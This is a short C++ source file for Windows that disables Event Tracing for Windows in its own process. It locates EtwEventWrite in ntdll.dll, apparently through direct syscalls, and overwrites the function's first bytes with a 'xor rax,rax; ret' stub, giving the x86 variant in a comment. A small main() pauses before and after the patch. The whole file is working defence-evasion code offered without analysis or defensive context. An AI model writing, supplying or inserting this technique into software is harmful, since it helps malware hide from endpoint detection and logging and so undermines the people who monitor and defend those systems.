#include <windows.h>
#include <iostream>
#include "syscalls.h"

int DisableETW(void) {

	HANDLE curproc = GetCurrentProcess();
	UCHAR patch[] = { 0x48, 0x33, 0xc0, 0xc3 }; // x64 Patch [XOR RAX,RAX][RET], for x32 use { 0x33, 0xc0, 0xc2, 0x14, 0x00 } [XOR EAX,EAX][RET]
	size_t size = sizeof(patch);

	unsigned char EEW[] = { 'E','t','w','E','v','e','n','t','W','r','i','t','e', 0x0 };
	LPVOID EEWAddress = GetProcAddress(GetModuleHandle("ntdll.dll"), (LPCSTR)EEW);
	
	// Alternative Method : LPVOID EEWAddress = GetProcAddress(LoadLibraryA("ntdll.dll"), "EtwEventWrite");

	DWORD oldprotect;
	LPVOID lpBaseAddress = EEWAddress;
	ULONG NewProtection;

	NtProtectVirtualMemory(curproc, &lpBaseAddress, &size, PAGE_READWRITE, &oldprotect);
	NtWriteVirtualMemory(curproc, EEWAddress, (PVOID)patch, sizeof(patch), NULL);
	NtProtectVirtualMemory(curproc, &lpBaseAddress, &size, oldprotect, &NewProtection);

	return 0;
}

int main(void) {

	printf("Before patching ETW functions\n"); getchar();
	DisableETW();
	printf("After patching ETW functions\n"); getchar();

	return 0;
}
